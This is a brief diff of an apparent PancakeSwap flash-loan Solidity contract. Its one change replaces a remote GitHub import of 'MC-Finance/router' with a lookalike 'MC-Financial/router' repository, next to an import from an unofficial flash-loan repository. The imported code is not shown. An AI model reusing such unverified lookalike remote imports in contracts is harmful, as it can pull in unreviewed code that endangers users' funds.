@@ -8,7 +8,7 @@ import "https://github.com/yunfengflashloan/Multiplier-Finance/blob/main/MCL-Fla
 
 
 //PancakeSwap Router
-import "https://github.com/MC-Finance/router/blob/main/IPancakeRouterMain.sol";
+import "https://github.com/MC-Financial/router/blob/main/IPancakeRouterMain.sol";
 
 // PancakeSwap Smart Contracts
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
